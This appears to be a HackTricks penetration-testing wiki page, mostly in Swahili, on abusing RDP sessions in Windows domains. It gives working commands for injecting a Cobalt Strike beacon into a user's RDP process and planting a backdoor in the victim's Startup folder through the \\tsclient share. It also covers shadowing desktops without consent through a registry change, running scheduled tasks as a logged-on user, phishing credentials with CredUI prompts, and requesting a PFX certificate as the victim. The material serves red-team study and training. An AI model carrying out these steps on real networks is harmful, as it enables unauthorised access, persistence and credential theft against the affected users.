# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Ikiwa **external group** ina **RDP access** kwa **computer** yoyote katika domain ya sasa, **attacker** angeweza **compromise that computer and wait for him**.

Mara mtumiaji huyo atakapofikia kupitia RDP, **attacker can pivot to that users session** na kutumia vibaya ruhusa zake kwenye domain ya nje.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Angalia **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Ikiwa mtumiaji anaingia kupitia **RDP into a machine** ambapo **attacker** anamsubiri, **attacker** ataweza **inject a beacon in the RDP session of the user** na ikiwa **victim mounted his drive** alipokuwa anapatafikia kupitia RDP, **attacker could access it**.

Katika kesi hii unaweza tu **compromise** the **victims** **original computer** kwa kuandika **backdoor** katika **statup folder**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Kama wewe ni **local admin** kwenye host ambapo mwathirika tayari ana **active RDP session**, unaweza kuwa na uwezo wa **view/control that desktop without stealing the password or dumping LSASS**.

Hii inategemea sera ya **Remote Desktop Services shadowing** iliyohifadhiwa katika:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Thamani za kuvutia:

- `0`: Imezimwa
- `1`: `EnableInputNotify` (udhibiti, inahitaji idhini ya mtumiaji)
- `2`: `EnableInputNoNotify` (udhibiti, **hakuna idhini ya mtumiaji**)
- `3`: `EnableNoInputNotify` (tazama tu, inahitaji idhini ya mtumiaji)
- `4`: `EnableNoInputNoNotify` (tazama tu, **hakuna idhini ya mtumiaji**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Hii ni hasa muhimu wakati privileged user aliyeunganishwa kupitia RDP ameacha desktop isiyofungwa, kikao cha KeePass, console ya MMC, kikao cha kivinjari, au admin shell wazi.

## Scheduled Tasks Kama Mtumiaji Aliyeingia

Ikiwa wewe ni **local admin** na mtumiaji lengwa **kwa sasa ameingia**, Task Scheduler inaweza kuanza code **kama mtumiaji huyo bila nenosiri lao**.

Hii inageuza kikao cha kuingia cha mwathirika kilichopo kuwa primitive ya utekelezaji:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Maelezo:

- Ikiwa mtumiaji **hayajaingia**, Windows kwa kawaida inahitaji nenosiri ili kuunda task ambayo itaendesha kama yeye.
- Ikiwa mtumiaji **ameingia**, task inaweza kutumia muktadha wa logon uliopo.
- Hii ni njia ya vitendo ya kutekeleza vitendo vya GUI au kuanzisha binaries ndani ya kikao cha mwanaathiri bila kugusa LSASS.

## CredUI Prompt Abuse From the Victim Session

Mara utakapoweza kutekeleza **ndani ya desktop ya mwingiliano ya mwanaathiri** (kwa mfano kupitia **Shadow RDP** au **scheduled task inayokimbia kama mtumiaji huyo**), unaweza kuonyesha **real Windows credential prompt** ukitumia CredUI APIs na kuvuna credentials zinazowekwa na mwanaathiri.

Relevant APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Typical flow:

1. Zalisha binary ndani ya kikao cha mwanaathiri.
2. Onyesha domain-authentication prompt inayolingana na chapa ya domain ya sasa.
3. Chambua buffer ya uthibitisho iliyorudishwa.
4. Thibitisha credentials zilizotolewa na kwa hiari endelea kuonyesha prompts hadi credentials sahihi zitakapowekwa.

Hii ni ya manufaa kwa **on-host phishing** kwa sababu prompt inarenderiwa na standard Windows APIs badala ya fomu ya HTML ya uongo.

## Requesting a PFX In the Victim Context

Primitive ile ile ya **scheduled-task-as-user** inaweza kutumika kuomba **certificate/PFX kama mwanaathiri aliyekuwa ameingia**. Cheti hicho kinaweza kutumika baadaye kwa **AD authentication** kama mtumiaji huyo, kuepuka kabisa wizi wa password.

High-level flow:

1. Pata **local admin** kwenye host ambapo mwanaathiri ameingia.
2. Endesha enrollment/export logic kama mwanaathiri ukitumia **scheduled task**.
3. Export resulting **PFX**.
4. Tumia PFX kwa PKINIT / certificate-based AD authentication.

See the AD CS pages for follow-up abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
